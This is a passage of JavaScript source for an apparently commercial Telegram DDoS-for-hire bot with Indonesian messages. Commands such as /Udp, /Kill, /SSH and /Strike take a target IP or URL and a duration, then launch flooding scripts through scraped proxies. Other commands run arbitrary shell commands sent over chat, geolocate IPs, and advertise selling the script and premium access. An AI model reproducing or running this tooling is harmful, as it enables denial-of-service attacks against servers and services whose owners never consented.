  const process = exec(`node Tls.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Tls\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Samp(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Samp.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Samp\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Kill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Kill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Kill\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});


bot.onText(/^\/Udp (\S+) (\d+) (\d+)$/, (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1];
  const port = match[2];
  const time = parseInt(match[3], 10);
  const isAdmin = adminIds.includes(chatId.toString());

  if (!ip || !port || !time) {
    bot.sendMessage(chatId, 'All parameters (IP, port, time) are required.');
    return;
  }

  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }

  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }

  const process = spawn('node', ['Udp.js', ip, port, time, '100', '50', 'proxy.txt']);

  if (!processes[chatId]) {
    processes[chatId] = new Set();
  }

  processes[chatId].add(process);

  setTimeout(() => {
    process.kill();
    processes[chatId].delete(process);
    bot.sendMessage(chatId, `Attack on ${ip}:${port} finished.`);
  }, time * 1000);

  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nIP: ${ip}\nPort: ${port}\nTime: ${time}\nRate: 100\nThread: 50\nMethods: udp\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/strom(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Strom.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Strom\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/wifi(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Wifi.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Wifi\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/SSH(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node SSH.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: SSH\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Strike(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Strike.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nPort: 443\nConcurents: 1\nMethods: Strike\nStatus: Owner`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;

  if (callbackQuery.data === 'stop') {
    const isAdmin = adminIds.includes(chatId.toString());

    if (!isAdmin) {
      bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menghentikan perintah ini.');
      return;
    }
    stopProcesses(chatId);
  }
});

bot.onText(/^\/upproxy$/, async (msg) => {
  const chatId = msg.chat.id;
  const isAdmin = adminIds.includes(chatId.toString());
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  try {
    if (fs.existsSync('proxy.txt')) {
      fs.unlinkSync('proxy.txt');
    }
    await scrapeProxies(chatId);
  } catch (error) {
    bot.sendMessage(chatId, `Terjadi kesalahan saat memperbarui proxy: ${error.message}`);
  }
});


bot.onText(/\/sh (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const command = match[1];
  const isAdmin = adminIds.includes(chatId.toString());
  
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Masa premium anda telah habis jika anda ingin memperpanjang masa premium silahkan hubungi owner @Harry_Burt');
    return;
  }
  
  exec(command, { maxBuffer: parseInt(adminData.limit) * 1024 }, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Stderr: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Output:\n${stdout}`);
  });
});

bot.onText(/^\/info (.+)/, (msg, match) => {
 const chatId = msg.chat.id;
 const web = match[1];
 const data = {
     target: web,
     apikey: 'NOKEY'
 };
 axios.post('https://check-host.cc/rest/V2/info', data, {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
   }
 })
 .then(response => {
     const result = response.data;
     if (result.status === 'success') {
         const info = `
          
\`\`\`INFORMASI-WEB+${web}
IP:        ${result.ip}
Hostname:  ${result.hostname}
ISP:       ${result.isp}
ASN:       ${result.asn}
ORG:       ${result.org}
Country:   ${result.country}
Region:    ${result.region}
City:      ${result.city}
Timezone:  ${result.timezone}
Latitude: ${result.latitude}
Longitude: ${result.longitude}
\`\`\`
*About ASN:* \`${result.asnlink}\`
*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
         `;
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } else {
         bot.sendMessage(chatId, 'Gagal mendapatkan informasi. Coba lagi nanti.');
     }
 })
 .catch(error => {
     console.error(error);
     bot.sendMessage(chatId, 'Terjadi kesalahan saat menghubungi API.');
 });
});
bot.onText(/\/script/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Mau Beli Script SC ini?\nKlik Button Di Bawah Untuk Menghubungi Developer Bot\n\nNote : Jangan Spamm!!",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Buy Script', url: `https://t.me/Harry_Burt` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/cekbot/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Haii Kak, Bot Online ( Aktif ), Jika Bot Off Mungkin Sedaang ada eror dipanel mohon cek dipanel yaa",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Zamss-XcV', url: `https://t.me/d_d_o_s1` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/^(\.|\#|\/)cekip(?: (.+))?$/, async (msg, match) => {
        const chatId = msg.chat.id;
        const ip = match[2];
        if (!ip) {
            bot.sendMessage(chatId, 'Input Link! Example /cekip ip nya ', { reply_to_message_id: msg.message_id });
            return;
        }

        try {
            const response = await axios.get(`https://apikey-premium.000webhostapp.com/loc/?IP=${ip}`);
            
            const data = response.data;
            bot.sendChatAction(chatId, 'typing');
            
            // Kirim informasi ke pengguna
            const message = `
ðŸŒ Creator : @Harry_Burt
ðŸ” IP : ${data.query}
ðŸ“Š Status : ${data.status}
ðŸŒ Country : ${data.country}
ðŸ—ºï¸ Country Code : ${data.countryCode}
ðŸžï¸ Region : ${data.region}
ðŸ¡ Region Name : ${data.regionName}
ðŸ™ï¸ City : ${data.city}
ðŸ˜ï¸ District : ${data.district}
ðŸ  Zip : ${data.zip}
ðŸŒ Latitude : ${data.lat}
ðŸŒ Longitude : ${data.lon}
â° Timezone : ${data.timezone}
ðŸ“¶ ISP : ${data.isp}
ðŸ¢ Organization : ${data.org}
ðŸŒ AS : ${data.as}
            `;
            
            bot.sendMessage(chatId, message);

            // Kirim lokasi ke pengguna
            bot.sendLocation(chatId, data.lat, data.lon);
        } catch (error) {
            console.error('Error:', error);
            // Kirim pesan error jika terjadi kesalahan
            bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
        }
    });
    
bot.onText(/^(\.|\#|\/)tinyurl(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[2];
  if (!url) {
      bot.sendMessage(chatId, 'Usage: /tinyulr [web]\nExample: /tinyulr https://web.com', { reply_to_message_id: msg.message_id });
       return;
    }
            
  // Pastikan URL dimulai dengan "http://" atau "https://"
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    bot.sendMessage(chatId, 'URL harus dimulai dengan "http://" atau "https://"');
    return;
  }

  try {
    const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
    const shortenedUrl = response.data;
    bot.sendChatAction(chatId, 'typing');
    bot.sendMessage(chatId, shortenedUrl);
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, 'Maaf, terjadi kesalahan saat mempersingkat URL.');
  }
});

bot.onText(/\/owner/, (msg) => {
      const chatId = msg.chat.id;
      const name = msg.from.first_name;
      const buttons = [
        {
          text: 'account',
          url: 'https://t.me/Harry_Burt'
        },
        {
          text: 'Telegram',
          url: 'https://t.me/Harry_Burt'
        },
        {
          text: 'CH CYBER JATENG',
          url: 'https://t.me/d_d_o_s1'
        }
      ];
      bot.sendMessage(chatId, `Halo kak ${name}, kamu bisa hubungi owner dengan memilih dibawah ini:`, {
        reply_markup: {
          inline_keyboard: [buttons]
        }
      });
    });
bot.on('polling_error', (error) => console.log(error));


